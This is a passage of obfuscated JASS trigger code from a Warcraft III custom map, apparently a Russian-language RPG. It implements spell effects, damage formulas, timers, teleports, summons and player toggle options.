set NQ=CreateUnitAtLoc(Player(0),$68303739,No,0)
set Ny=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Ny="Abilities\\Spells\\NightElf\\Cyclone\\CycloneTarget.mdl"
endif
call AddSpecialEffectTarget(Ny,NQ,"origin")
call SetUnitVertexColor(NQ,255,0,0,255)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,NQ)
call SaveInteger(Nq,GetHandleId(Hc),2,8)
call TimerStart(Hc,1,true,function oe)
set Hc=null
call RemoveLocation(No)
set No=null
elseif GetSpellAbilityId()==$41304D39 then
set Nt=500+GetHeroInt(MT[GetPlayerId(GetOwningPlayer(Hu))],true)/2
set Ot=50+GetHeroInt(MT[GetPlayerId(GetOwningPlayer(Hu))],true)/20
call nj(MB,Nt)
call nl(MB,Ot)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,MB)
call SaveInteger(PP,GetHandleId(Hc),2,Nt)
call SaveInteger(PP,GetHandleId(Hc),3,Ot)
call TimerStart(Hc,10,true,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41304E44 then
set No=GetSpellTargetLoc()
set NQ=CreateUnitAtLoc(Player(0),$68303739,No,0)
call AddSpecialEffectTarget("Abilities\\Spells\\NightElf\\Cyclone\\CycloneTarget.mdl",NQ,"origin")
call SetUnitVertexColor(NQ,0,255,0,255)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,NQ)
call SaveInteger(Nq,GetHandleId(Hc),2,8)
call TimerStart(Hc,1,true,function od)
set Hc=null
call RemoveLocation(No)
set No=null
elseif GetSpellAbilityId()==$41304957 then
if nO(Hu,$49304353) or nO(Hu,$49304448) then
set Nt=3000+GetHeroStr(Hu,true)/3
elseif nO(Hu,$4930445A) or nO(Hu,$49304634) then
set Nt=5000+GetHeroStr(Hu,true)/2
elseif nO(Hu,$4930464D) or nO(Hu,$49304742) then
set Nt=5000+GetHeroStr(Hu,true)
endif
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mw)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),600,Np)
set Nu=Nt
call ForGroup(Mc,function m4)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
elseif GetSpellAbilityId()==$41305445 then
call UnitAddAbility(Hu,$41305442)
if nO(Hu,$49304537) or nO(Hu,$49304638) then
call SetUnitAbilityLevel(Hu,$41305442,2)
elseif nO(Hu,$49304651) or nO(Hu,$49304746) then
call SetUnitAbilityLevel(Hu,$41305442,3)
endif
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),2,Hu)
call TimerStart(Hc,7,false,function ob)
set Hc=null
elseif GetSpellAbilityId()==$41305542 then
set NT=I2R((GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))*5)
call UnitDamageTarget(Hu,MB,NT,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set No=GetUnitLoc(MB)
set NQ=CreateUnitAtLoc(Player(0),$68303739,No,0)
call UnitAddAbility(NQ,$41305530)
call IssueTargetOrder(NQ,"innerfire",MB)
call nD(NQ,2)
call RemoveLocation(No)
set No=null
elseif GetSpellAbilityId()==$41313045 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))
if GetOwningPlayer(MB)==Player(PLAYER_NEUTRAL_AGGRESSIVE) or GetOwningPlayer(MB)==Player(Ma) then
if GetUnitLevel(MB)<=10 then
if UZ[Ma+150]!=MB then
call RemoveUnit(UZ[Ma+150])
call SetUnitOwner(MB,GetOwningPlayer(Hu),true)
set UZ[Ma+150]=MB
call UnitAddAbility(MB,$41303758)
call UnitApplyTimedLife(MB,$42544C46,250)
set Ma=GetPlayerId(GetOwningPlayer(Hu))+1
set Nt=GetHeroStr(Hu,true)+GetHeroStr(Hu,true)*UM[Ma]/100
call nj(MB,Nt)
else
call UnitApplyTimedLife(MB,$42544C46,250)
endif
endif
endif
elseif GetSpellAbilityId()==$41305531 then
set No=GetSpellTargetLoc()
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\NightElf\\Starfall\\StarfallTarget.mdl",No))
call TriggerSleepAction(.8)
set Nt=0
loop
set Ou=nU(No,GetRandomReal(50,450),GetRandomReal(0,360))
set NQ=CreateUnitAtLoc(Player(0),$68303739,Ou,0)
set Ny=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Ny="war3mapImported\\Item_Shard_Purple.mdl"
endif
call AddSpecialEffectTarget(Ny,NQ,"overhead")
call SetUnitVertexColor(NQ,0,255,0,255)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,NQ)
call SaveInteger(Nq,GetHandleId(Hc),2,5)
call TimerStart(Hc,1,true,function oa)
set Hc=null
call RemoveLocation(Ou)
set Ou=null
set Nt=Nt+1
exitwhen Nt>6
endloop
call RemoveLocation(No)
set No=null
elseif GetSpellAbilityId()==$41305533 then
call UnitAddAbility(Hu,$41304837)
set Nt=GetHeroStr(Hu,true)+300
if nO(Hu,$49304531) or nO(Hu,$49304635) then
set Nt=GetHeroStr(Hu,true)+1000
elseif nO(Hu,$4930464E) or nO(Hu,$49304743) then
set Nt=GetHeroStr(Hu,true)*2+500
endif
call nj(MB,Nt)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),2,Nt)
call TimerStart(Hc,8,true,function nE)
set Hc=null
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),2,9)
call TimerStart(Hc,1,true,function oZ)
set Hc=null
elseif GetSpellAbilityId()==$41305756 then
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mv)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),1000,Np)
call ForGroup(Mc,function ok)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
elseif GetSpellAbilityId()==$41305757 then
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mv)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),1000,Np)
call ForGroup(Mc,function oj)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
elseif GetSpellAbilityId()==$41305A38 then
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mv)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),1000,Np)
call ForGroup(Mc,function oi)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
elseif GetSpellAbilityId()==$41305143 then
set No=GetUnitLoc(MB)
call m1(Hu,MB,GetHeroStr(MT[GetPlayerId(GetOwningPlayer(Hu))],true)*5)
set NQ=CreateUnitAtLoc(Player(0),$68303739,No,0)
call nD(NQ,1)
call UnitAddAbility(NQ,$4131324E)
call IssueTargetOrder(NQ,"creepthunderbolt",MB)
call RemoveLocation(No)
set NQ=null
set No=null
elseif GetSpellAbilityId()==$41313237 then
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mv)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),600,Np)
call ForGroup(Mc,function oh)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
set No=GetUnitLoc(Hu)
set Mc=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),300,Np)
set Nu=500+GetHeroStr(MT[GetPlayerId(GetOwningPlayer(Hu))],true)*4
set Pq=MT[GetPlayerId(GetOwningPlayer(Hu))]
call ForGroup(Mc,function nB)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
elseif GetSpellAbilityId()==$41304A49 then
set Mc=CreateGroup()
set No=GetUnitLoc(K7)
set Np=Condition(function mv)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),1500,Np)
call ForGroup(Mc,function om)
call DestroyBoolExpr(Np)
call DestroyGroup(Mc)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
call UnitRemoveAbility(K7,$41304545)
call SetUnitState(K7,UNIT_STATE_LIFE,$5F5E0FF)
elseif GetSpellAbilityId()==$41305934 then
call UnitAddAbility(GetSpellTargetUnit(),$41305933)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,GetSpellTargetUnit())
call SaveInteger(Nq,GetHandleId(Hc),2,0)
call TimerStart(Hc,1,true,function oX)
set Hc=null
elseif GetSpellAbilityId()==$41305935 then
set No=GetUnitLoc(Hu)
set Ou=GetUnitLoc(GetSpellTargetUnit())
set Ov=I2R(GetHeroAgi(Hu,true)+GetHeroInt(Hu,true))/50*DistanceBetweenPoints(No,Ou)
call UnitDamageTarget(Hu,GetSpellTargetUnit(),Ov,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
call m2(Hu,R2I(Ov/2))
call RemoveLocation(No)
call RemoveLocation(Ou)
set No=null
set Ou=null
elseif GetSpellAbilityId()==$41305849 and IsUnitType(Hu,UNIT_TYPE_HERO) then
set No=GetUnitLoc(Hu)
set Ou=nU(No,150,0)
call CreateItem($72616D33,GetLocationX(Ou),GetLocationY(Ou))
call RemoveLocation(Ou)
set Ou=nU(No,150,120)
call CreateItem($72616D32,GetLocationX(Ou),GetLocationY(Ou))
call RemoveLocation(Ou)
set Ou=nU(No,150,240)
call CreateItem($72616D31,GetLocationX(Ou),GetLocationY(Ou))
call RemoveLocation(Ou)
call RemoveLocation(No)
set Ou=null
set No=null
elseif GetSpellAbilityId()==$41313742 then
set No=GetSpellTargetLoc()
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,No,0)
set Ny=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Ny="Abilities\\Spells\\NightElf\\Cyclone\\CycloneTarget.mdl"
endif
call AddSpecialEffectTarget(Ny,NQ,"origin")
call SetUnitVertexColor(NQ,255,0,255,255)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,NQ)
call SaveInteger(Nq,GetHandleId(Hc),2,8)
call TimerStart(Hc,1,true,function oc)
set Hc=null
call RemoveLocation(No)
set No=null
endif
endif
if GetSpellAbilityId()==$41304636 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))
if GetUnitAbilityLevel(MT[Ma],$41304B54)>=1 then
call UnitRemoveAbility(MT[Ma],$41304B54)
call DisplayTextToPlayer(Player(Ma),0,0,"Автоклик |c00ff0000выключен")
else
call UnitAddAbility(MT[Ma],$41304B54)
call DisplayTextToPlayer(Player(Ma),0,0,"Автоклик |c0000ff00включен")
endif
elseif GetSpellAbilityId()==$41304252 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))+1
if GetOwningPlayer(Hu)==GetLocalPlayer() then
call MultiboardDisplay(OC[10],true)
call MultiboardMinimize(OC[10],false)
endif
elseif GetSpellAbilityId()==$41313738 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))
call SetUnitAbilityLevel(MT[Ma],$41313041,GetUnitAbilityLevel(MT[Ma],$41313041)-1)
elseif GetSpellAbilityId()==$41313737 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))
call SetUnitAbilityLevel(MT[Ma],$41313041,GetUnitAbilityLevel(MT[Ma],$41313041)+1)
elseif GetSpellAbilityId()==$41305134 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))
call nV(Player(Ma))
elseif GetSpellAbilityId()==$41305131 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))
set No=Location(-15420,2222)
call SetUnitPositionLoc(MT[Ma],No)
call KillUnit(MT[Ma])
set Ro[Ma+1]=Ro[Ma+1]-1
call RemoveLocation(No)
set No=null
elseif GetSpellAbilityId()==$4130344D then
set Ma=GetPlayerId(GetOwningPlayer(Hu))+1
if Vw[Ma]==true then
set Vw[Ma]=false
if GetOwningPlayer(Hu)==GetLocalPlayer() then
call MultiboardDisplay(OC[Ma],true)
call MultiboardMinimize(OC[Ma],false)
endif
else
set Vw[Ma]=true
if GetOwningPlayer(Hu)==GetLocalPlayer() then
call MultiboardDisplay(Pb,true)
call MultiboardMinimize(Pb,false)
endif
endif
elseif GetSpellAbilityId()==$41303436 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))
if GetUnitAbilityLevel(MT[Ma],$41313059)>=1 then
call UnitRemoveAbility(MT[Ma],$41313059)
call DisplayTextToPlayer(Player(Ma),0,0,"Отображение урона и исцеления |c00ff0000выключено")
else
call UnitAddAbility(MT[Ma],$41313059)
call DisplayTextToPlayer(Player(Ma),0,0,"Отображение урона и исцеления |c0000ff00включено")
endif
elseif GetSpellAbilityId()==$41304635 then
set Ma=GetPlayerId(GetOwningPlayer(Hu))
if GetUnitAbilityLevel(MT[Ma],$41303944)>=1 then
call UnitRemoveAbility(MT[Ma],$41303944)
call SetPlayerName(Player(Ma),OD[Ma]+OE[Ma])
call DisplayTextToPlayer(Player(Ma),0,0,"Приписка трофея |c00ff0000выключена")
else
call UnitAddAbility(MT[Ma],$41303944)
call DisplayTextToPlayer(Player(Ma),0,0,"Приписка трофея |c0000ff00включена")
call SetPlayerName(Player(Ma),PR[Ma])
endif
endif
if GetSpellAbilityId()!=$41304656 and GetSpellAbilityId()!=$41304653 and GetSpellAbilityId()!=$41313530 and GetSpellAbilityId()!=$41313232 and GetSpellAbilityId()!=$4131364C and GetSpellAbilityId()!=$41305845 then
if nO(Hu,$49313147) or nO(Hu,$49313136) or nO(Hu,$49313059) or nO(Hu,$49313143) or nO(Hu,$49313132) or nO(Hu,$49313130) or nO(Hu,$49313141) or nO(Hu,$49313057) or nO(Hu,$49313134) or nO(Hu,$49313145) or nO(Hu,$49313055) or nO(Hu,$49313138) then
if IsUnitType(Hu,UNIT_TYPE_HERO) and GetUnitAbilityLevel(Hu,GetSpellAbilityId())>=1 and GetRandomInt(1,4)==1 and Ps[GetPlayerId(GetOwningPlayer(Hu))]!=1 then
set No=GetUnitLoc(Hu)
set Ou=nU(No,100,GetRandomReal(1,360))
if GetRandomInt(1,3)==1 then
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$6E303642,Ou,0)
elseif GetRandomInt(1,2)==1 then
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$6E303038,Ou,0)
elseif GetRandomInt(1,1)==1 then
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$6E303039,Ou,0)
endif
set Ps[GetPlayerId(GetOwningPlayer(Hu))]=1
call nj(NQ,GetHeroStr(Hu,true)+GetHeroInt(Hu,true)+GetHeroAgi(Hu,true))
call nD(NQ,7)
call RemoveLocation(No)
call RemoveLocation(Ou)
set No=null
set Ou=null
set NQ=null
endif
endif
endif
set Hu=null
set MB=null
set Hc=null
set NQ=null
endfunction
function oo takes nothing returns nothing
call SetUnitInvulnerable(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),false)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function op takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),2),$4162756E)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function oq takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit MB=GetSpellTargetUnit()
local real NT
local unit NQ
local timer Hc
local group Na
local boolexpr Vx
local location Ht
if GetUnitAbilityLevel(Hu,$41304233)==0 then
if GetSpellAbilityId()==$41313744 then
call SetUnitInvulnerable(Hu,true)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,3,false,function oo)
set Hc=null
elseif GetSpellAbilityId()==$4131354D then
if IsUnitType(Hu,UNIT_TYPE_HERO)==true then
set NT=GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*.15
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)-NT)
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Vx)
set Nu=R2I(NT)
call ForGroup(Na,function m5)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
set Na=CreateGroup()
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Vx)
set Nu=R2I(NT*2)
set Pq=Hu
call ForGroup(Na,function m7)
call DestroyGroup(Na)
call DestroyBoolExpr(Vx)
set Na=null
set Vx=null
call RemoveLocation(Ht)
set Ht=null
endif
elseif GetSpellAbilityId()==$41313951 then
call UnitAddAbility(MB,$4162756E)
set NT=I2R(GetHeroAgi(Hu,true)*5)
if nO(Hu,$49313151) or nO(Hu,$4931314D) then
set NT=I2R(GetHeroAgi(Hu,true)*10)
elseif nO(Hu,$4931314E) or nO(Hu,$4931314F) then
set NT=I2R(GetHeroAgi(Hu,true)*15)
endif
call m1(Hu,MB,R2I(NT))
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),2,MB)
call TimerStart(Hc,4,false,function op)
set Hc=null
endif
endif
set Hu=null
set MB=null
set Hc=null
set NQ=null
endfunction
function os takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function on)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function oq)
set Hc=null
endfunction
function ot takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E687963) then
return false
endif
if not (GetRandomInt(1,10)==1) then
return false
endif
return true
endfunction
function ou takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (RectContainsUnit(EK,GetTriggerUnit())==true) then
return false
endif
if not (GetRandomInt(1,8)==1) then
return false
endif
return true
endfunction
function ov takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function ow takes nothing returns nothing
call IssueTargetOrderBJ(GetEnumUnit(),"attack",GetTriggerUnit())
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_MAX_LIFE,GetTriggerUnit())*1.5,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL)
endfunction
function ox takes nothing returns boolean
if not (GetSpellAbilityId()==$41305036) then
return false
endif
return true
endfunction
function oy takes nothing returns boolean
if not (GetSpellAbilityId()==$41303758) then
return false
endif
return true
endfunction
function oz takes nothing returns boolean
if GetUnitTypeId(GetSpellTargetUnit())==$68303351 then
return true
endif
if GetUnitTypeId(GetSpellTargetUnit())==$65303058 then
return true
endif
return false
endfunction
function o0 takes nothing returns boolean
if not oz() then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function o1 takes nothing returns boolean
if not (GetSpellTargetUnit()==Lp) then
return false
endif
return true
endfunction
function o2 takes nothing returns boolean
if not (GetSpellAbilityId()==$41313550) then
return false
endif
return true
endfunction
function o3 takes nothing returns boolean
if not (GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$416E6532)>=1) then
return false
endif
return true
endfunction
function o4 takes nothing returns boolean
if not (GetSpellAbilityId()==$41305133) then
return false
endif
return true
endfunction
function o5 takes nothing returns nothing
call UnitRemoveBuffBJ($42303539,GetTriggerUnit())
if ot() then
call SetUnitAbilityLevelSwapped($4131394B,GetTriggerUnit(),GetUnitAbilityLevel(GetTriggerUnit(),$4131394B)+1)
call SetUnitAbilityLevelSwapped($4131394F,GetTriggerUnit(),GetUnitAbilityLevel(GetTriggerUnit(),$4131394F)+1)
call CreateTextTagUnitBJ("Я становлюсь сильнее!",GetSpellAbilityUnit(),0,15.,0.,100,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,1.)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),0.)
else
endif
if ou() then
set Vz=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303453,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
else
endif
if ox() then
set V0=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(600.,V0,Condition(function ov))
call ForGroupBJ(SR,function ow)
call DestroyGroup(SR)
call RemoveLocation(V0)
else
endif
if oy() then
set Vz=GetUnitLoc(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1])
call SetUnitPositionLoc(GetTriggerUnit(),Vz)
call RemoveLocation(Vz)
else
endif
if o0() then
call KillUnit(GetTriggerUnit())
else
endif
if o1() then
call SetUnitLifePercentBJ(GetTriggerUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetTriggerUnit())-GetUnitStateSwap(UNIT_STATE_MAX_LIFE,GetTriggerUnit())/5.)
call CreateTextTagUnitBJ("|c007d7d7dДАВАЙ, ЗАКЛИНАЙ МЕНЯ!!!",Lp,0,10,100,100,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90.)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
else
endif
if o2() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*20.,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
else
endif
if o4() then
if o3() then
call UnitRemoveAbility(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$416E6532)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Контроль способностей |c00ff0000выключен")
else
call UnitAddAbility(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$416E6532)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Контроль способностей |c0000ff00включен")
endif
else
endif
endfunction
function o6 takes nothing returns nothing
set Vy=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Vy,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Vy,function o5)
endfunction
function o7 takes unit Hu,rect NT,location Ht returns nothing
if RectContainsUnit(NT,MT[GetPlayerId(GetOwningPlayer(Hu))]) then
call SetUnitPositionLoc(MT[GetPlayerId(GetOwningPlayer(Hu))],Ht)
if GetLocalPlayer()==GetOwningPlayer(Hu) then
call PanCameraToTimed(GetLocationX(Ht),GetLocationY(Ht),0)
endif
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\MassTeleportCaster.mdx",MT[GetPlayerId(GetOwningPlayer(Hu))],"origin"))
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\MASSTeleportTo.MDX",MT[GetPlayerId(GetOwningPlayer(Hu))],"origin"))
call RemoveLocation(Ht)
endif
endfunction
function o8 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
if GetSpellAbilityId()==$41313931 then
call o7(Hu,Gd,Location(-15680,-8340))
call o7(Hu,J,Location(-4150,-9050))
call o7(Hu,BD,Location(-236,-9377))
call o7(Hu,x,Location(-8970,7888))
call o7(Hu,Di,Location(-8070,15170))
call o7(Hu,B7,Location(7450,-2190))
call o7(Hu,GJ,Location(10570,5000))
call o7(Hu,D6,Location(11000,-7850))
call o7(Hu,FK,Location(-12900,-9656))
call o7(Hu,FJ,Location(21100,10880))
call o7(Hu,FI,Location(-12600,-3000))
call o7(Hu,DL,Location(-2110,-900))
call o7(Hu,Ed,Location(13030,4750))
call o7(Hu,Cs,Location(-11900,2170))
call o7(Hu,Fn,Location(-4950,-12200))
call o7(Hu,EO,Location(-8950,5800))
call o7(Hu,EN,Location(-8950,5800))
call o7(Hu,Gt,Location(2230,3290))
call o7(Hu,Gz,Location(15500,80))
call o7(Hu,Gx,Location(5755,-4600))
call o7(Hu,FW,Location(2950,11880))
call o7(Hu,FX,Location(-11400,1050))
call o7(Hu,FG,Location(-1412,10400))
call o7(Hu,FL,Location(23300,11100))
call o7(Hu,GW,Location(18450,1680))
call o7(Hu,Ey,Location(6383,7524))
call o7(Hu,EK,Location(6383,7524))
call o7(Hu,FH,Location(6383,7524))
call o7(Hu,D2,Location(-2460,13180))
endif
set Hu=null
endfunction
function o9 takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function o8)
set Hc=null
endfunction
function pB takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call UnitRemoveAbility(Hu,$41305038)
call UnitRemoveAbility(Hu,$41313438)
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Hu=null
endfunction
function pC takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local real Mc
local group No
local location Np
local boolexpr Nt
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\ShivasEnchantment.mdx",NQ,"origin"))
set Mc=I2R(GetUnitAbilityLevel(Hu,$41313430)*50+GetHeroInt(Hu,true)/2)*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
if GetUnitAbilityLevel(NQ,$41304C59)==2 then
call m2(NQ,R2I(Mc/2))
set No=CreateGroup()
set Np=GetUnitLoc(NQ)
set Nt=Condition(function mw)
call GroupEnumUnitsInRange(No,GetLocationX(Np),GetLocationY(Np),400,Nt)
set Nu=R2I(Mc/2)
call ForGroup(No,function m4)
call DestroyGroup(No)
call DestroyBoolExpr(Nt)
call RemoveLocation(Np)
set Np=null
set No=null
set Nt=null
else
call m2(NQ,R2I(Mc))
endif
else
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call UnitRemoveAbility(NQ,$41304C59)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
endfunction
function pD takes nothing returns nothing
call PauseUnit(GetEnumUnit(),false)
call UnitRemoveAbility(GetEnumUnit(),$41313438)
endfunction
function pE takes nothing returns nothing
if IsUnitInGroup(GetEnumUnit(),V2[GetPlayerId(GetOwningPlayer(Pq))])==false then
call GroupAddUnit(V2[GetPlayerId(GetOwningPlayer(Pq))],GetEnumUnit())
call mz(Pq,GetEnumUnit(),Nu)
call PauseUnit(GetEnumUnit(),true)
if GetUnitAbilityLevel(Pq,$41303853)>=1 then
call UnitAddAbility(GetEnumUnit(),$41313438)
call SetUnitAbilityLevel(GetEnumUnit(),$41313438,8)
endif
endif
endfunction
function pF takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local group Mc
local location No
local boolexpr Np
local real Nt
set Pq=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mx)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),400,Np)
set Nt=I2R(GetUnitAbilityLevel(Pq,$4131335A)*(1500+GetHeroInt(Pq,true)*3))*N0[GetPlayerId(GetOwningPlayer(Pq))+1]
set Nu=R2I(Nt)
